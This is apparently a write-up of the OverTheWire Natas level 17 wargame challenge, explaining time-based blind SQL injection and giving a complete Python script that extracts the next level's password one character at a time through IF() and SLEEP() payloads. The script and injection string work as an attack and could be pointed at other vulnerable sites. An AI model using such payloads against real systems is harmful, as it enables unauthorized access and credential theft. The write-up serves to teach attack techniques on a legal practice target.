# Natas Level 16 → Level 17

## Objective
Retrieve the Natas 18 password by exploiting a Time-Based Blind SQL Injection where no visual feedback is provided by the server.

## Details
* **Vulnerability:** Time-Based Blind SQL Injection.
* **The Challenge:** The application is completely "silent." Whether a user exists or not, the page looks identical. There is no "This user exists" message to use for boolean leakage.
* **Tools Used:** Python (`requests` library), SQL `IF()` and `SLEEP()` functions.

## Process
* Observed that the application is vulnerable to SQL injection but suppresses all output, requiring a **temporal (time-based) side-channel** to leak data.
* Used the `SLEEP()` function to force the database to pause the response if a condition is met.
* **Logic:** 
    * The query effectively becomes: `SELECT * from users where username="natas18" AND IF(password LIKE BINARY '[char]%', SLEEP(5), NULL)`.
    * **If correct:** The database sees the condition is true, executes `SLEEP(5)`, and the web page takes over 5 seconds to load.
    * **If incorrect:** The database returns immediately, and the page loads instantly.
* **Automation:** Developed a Python script to measure the response time for each character guess. If the elapsed time is greater than a certain threshold (e.g., 2 or 3 seconds), the character is confirmed.

## Python Exploit
```python
import requests
from requests.auth import HTTPBasicAuth

target = "[http://natas17.natas.labs.overthewire.org/]"
auth = HTTPBasicAuth('natas17', 'PASSWORD_FROM_LEVEL_16')
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

print("[*] Brute-forcing Natas 18 password via Time-Based Injection...")

for i in range(32):
    for char in chars:
        payload = {'username': f'natas18" AND IF(password LIKE BINARY "{password}{char}%", SLEEP(5), 1)#'}
        
        try:
            r = requests.post(target, data=payload, auth=auth, timeout=10)

            if r.elapsed.total_seconds() >= 4.5:
                password += char
                print(f"[+] Found: {password}")
                break
        except requests.exceptions.Timeout:
            password += char
            print(f"[+] Found (Timeout): {password}")
            break

print(f"\n[!] Final Password: {password}")

